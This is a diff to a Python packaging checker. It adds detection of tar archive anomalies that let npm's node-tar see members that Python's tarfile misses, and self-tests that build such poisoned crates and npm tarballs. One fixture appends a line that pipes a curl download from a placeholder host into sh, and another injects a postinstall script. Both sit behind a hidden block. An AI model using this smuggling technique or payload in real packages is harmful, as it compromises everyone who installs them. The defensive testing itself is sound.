@@ -47,6 +47,7 @@ import contextlib
 import dataclasses
 import datetime
 import email.parser
+import gzip
 import hashlib
 import io
 import json
@@ -274,17 +275,54 @@ _TAR_KINDS = {tarfile.SYMTYPE: "symlink", tarfile.LNKTYPE: "hard link", tarfile.
               tarfile.BLKTYPE: "block device", tarfile.FIFOTYPE: "FIFO"}
 
 
-def read_tar(path: pathlib.Path):
-    """A tar(.gz) archive → ({path below the top dir: bytes}, top dir, special members).
+def _tar_anomalies(path: pathlib.Path, members: list) -> list:
+    """Ways the archive's bytes differ from the single clean tar stream npm's
+    node-tar (the consumer's extractor, and `npm publish <tgz>`'s manifest read)
+    reads past but Python's default tarfile parse does not: a member that only a
+    lenient (ignore_zeros) parse lists — after an all-zero block or a
+    bad-checksum block, both of which stop the default parse — any non-NUL byte
+    after the last member's data, and a duplicate member name (last wins for
+    both readers, but it is never legitimate here)."""
+    raw = path.read_bytes()
+    if raw[:2] == b"\x1f\x8b":
+        raw = gzip.decompress(raw)
+    problems = []
+    try:
+        with tarfile.open(fileobj=io.BytesIO(raw), ignore_zeros=True) as lenient:
+            lenient_names = [m.name for m in lenient.getmembers()]
+    except tarfile.TarError as err:
+        return [f"the archive does not parse cleanly even leniently: {err}"]
+    names = [m.name for m in members]
+    if lenient_names != names:
+        problems.append(f"{len(lenient_names) - len(names)} member(s) only a lenient parse lists "
+                        "(a member after an all-zero or bad-checksum block)")
+    if members:
+        last = members[-1]
+        end = last.offset_data + last.size + (-last.size % 512)
+        if not set(raw[end:]) <= {0}:
+            problems.append("non-NUL byte(s) after the last member's data")
+    dupes = sorted({name for name in names if names.count(name) > 1})
+    if dupes:
+        problems.append(f"duplicate member name(s): {', '.join(dupes)}")
+    return problems
 
-    Only regular files reach the dict. Any member that is neither a regular
-    file nor a directory (a symlink, a hard link, a device, a FIFO) is listed
-    in SPECIAL: no packer here writes one, and the file-set and stray checks
-    would never see what it points to.
+
+def read_tar(path: pathlib.Path):
+    """A tar(.gz) archive → ({path below the top dir: bytes}, top dir, problems).
+
+    Only regular files reach the dict. PROBLEMS collects every reason the
+    archive is not a single clean tar of regular files and directories:
+    - a member that is neither a regular file nor a directory (a symlink, a
+      hard link, a device, a FIFO) — no packer here writes one, and the
+      file-set and stray checks would never see what it points to;
+    - a tar-stream anomaly (see _tar_anomalies) that makes Python read fewer
+      members than node-tar does, so an inspected tarball and the one a
+      consumer installs would differ.
     """
     files, tops, special = {}, set(), []
     with tarfile.open(path) as archive:
-        for member in archive.getmembers():
+        members = archive.getmembers()
+        for member in members:
             top, _, inner = member.name.partition("/")
             if member.isdir():
                 continue
@@ -294,11 +332,13 @@ def read_tar(path: pathlib.Path):
                 continue
             handle = archive.extractfile(member)
             files[inner] = handle.read() if handle else b""
+    special += _tar_anomalies(path, members)
     return files, (tops.pop() if len(tops) == 1 else "|".join(sorted(tops))), special
 
 
 def check_members(art: Artifact, special: list) -> None:
-    art.check("only regular files and directories (no link, device or FIFO member)", not special,
+    art.check("one clean tar of regular files and directories (no link, device or FIFO member; no member past "
+              "an end-of-archive or bad block, no trailing data, no duplicate name)", not special,
               "; ".join(special))
 
 
@@ -1225,6 +1265,33 @@ def _zip(path: pathlib.Path, files: dict) -> pathlib.Path:
     return path
 
 
+def _tar_member(name: str, data: bytes) -> bytes:
+    info = tarfile.TarInfo(name)
+    info.size, info.mode, info.mtime = len(data), 0o644, 0
+    return info.tobuf(tarfile.USTAR_FORMAT) + data + b"\0" * (-len(data) % 512)
+
+
+def _raw_tar(path: pathlib.Path, top: str, files: dict, segments) -> pathlib.Path:
+    """FILES as regular members under TOP, then SEGMENTS appended before the
+    end-of-archive blocks, so Python's default parse and node-tar's can diverge.
+    A segment is ('zero',) one all-zero block, ('bad',) one bad-checksum block,
+    ('file', name, data) a raw member, or ('raw', bytes) arbitrary bytes."""
+    stream = b"".join(_tar_member(f"{top}/{name}", data) for name, data in sorted(files.items()))
+    for seg in segments:
+        if seg[0] == "zero":
+            stream += b"\0" * 512
+        elif seg[0] == "bad":
+            stream += b"X" * 512
+        elif seg[0] == "file":
+            stream += _tar_member(f"{top}/{seg[1]}", seg[2])
+        elif seg[0] == "raw":
+            stream += seg[1]
+    stream += b"\0" * 1024  # the end-of-archive marker
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_bytes(gzip.compress(stream, mtime=0))
+    return path
+
+
 def _clean_crate(version: str) -> dict:
     core = ROOT / "crates" / "qrcode-ai-scanner"
     manifest = f'[package]\nname = "qrcode-ai-scanner"\nversion = "{version}"\nlicense = "{SPDX}"\n'
@@ -1418,6 +1485,53 @@ def self_test() -> int:
             "qrcode-ai-scanner-py/src/data.rs": (tarfile.SYMTYPE, "../../../../etc/passwd")})], FAIL, "(symlink)")
         judge("platform package + a FIFO member", [npm("platform-fifo", _npm_platform(version, "linux-x64-gnu"), {
             "pipe": (tarfile.FIFOTYPE, "")})], FAIL, "pipe (FIFO)")
+
+        # Tar-stream differentials: Python's default parse stops at the first
+        # all-zero or bad-checksum block, while node-tar (what a consumer's
+        # install and `npm publish <tgz>` read) skips a lone zero block, warns
+        # past a bad one, then keeps reading. A member hidden behind one, or
+        # trailing bytes, or a duplicate name, must fail.
+        def raw_crate(name: str, segments) -> pathlib.Path:
+            return _raw_tar(place(name, f"qrcode-ai-scanner-{version}.crate"), f"qrcode-ai-scanner-{version}",
+                            _clean_crate(version), segments)
+
+        def raw_npm(name: str, files: dict, segments, top: str = "package") -> pathlib.Path:
+            pkg = json.loads(files["package.json"])
+            return _raw_tar(place(name, f"{pkg['name'].lstrip('@').replace('/', '-')}-{version}.tgz"), top, files,
+                            segments)
+
+        evil = b"\nrequire('child_process').execSync('curl -s https://example.invalid/x | sh');\n"
+        judge("crate: a lone zero block then a hidden member",
+              [raw_crate("tar-zero", [("zero",), ("file", "src/evil.rs", b"// hidden\n")])],
+              FAIL, "only a lenient parse lists")
+        judge("crate: a bad-checksum block then a hidden member",
+              [raw_crate("tar-bad", [("bad",), ("file", "src/evil.rs", b"// hidden\n")])],
+              FAIL, "only a lenient parse lists")
+        judge("crate: non-NUL bytes after a clean end-of-archive",
+              [raw_crate("tar-trailing", [("raw", b"\0" * 1024 + b"trailer")])],
+              FAIL, "non-NUL byte")
+        judge("crate: a duplicate member name",
+              [raw_crate("tar-dupe", [("file", "src/lib.rs", b"//! a second copy\n")])],
+              FAIL, "duplicate member name")
+        # The npm shapes the real-pack differential uses (node-tar yields the
+        # altered file; the default parse never sees it): the main package with
+        # a lone zero block then an altered index.js, and the wasm package with
+        # a bad block then a package.json that adds a postinstall.
+        node_index = (NODE_DIR / "index.js").read_bytes()
+        judge("main npm package: a lone zero block then an altered index.js",
+              [raw_npm("tar-npm-main", _npm_main(version), [("zero",), ("file", "index.js", node_index + evil)])],
+              FAIL, "only a lenient parse lists")
+        wasm_poisoned = json.loads(_npm_wasm(version)["package.json"])
+        wasm_poisoned["scripts"] = {"postinstall": "sh x"}
+        judge("wasm npm package: a bad block then a package.json with postinstall",
+              [raw_npm("tar-npm-wasm", _npm_wasm(version),
+                       [("bad",), ("file", "package.json", json.dumps(wasm_poisoned).encode())])],
+              FAIL, "only a lenient parse lists")
+        # A clean crate and a clean npm pack built raw (end marker, no segment)
+        # still pass: the end-of-archive zeros are not "trailing data".
+        judge("crate built raw, no anomaly (control)", [raw_crate("tar-clean", [])], PASS)
+        judge("main npm package built raw, no anomaly (control)", [raw_npm("tar-npm-clean", _npm_main(version), [])],
+              PASS)
 
         # The AGPL text where PEP 639 says it is, byte for byte.
         judge("win wheel with a CRLF LICENSE",
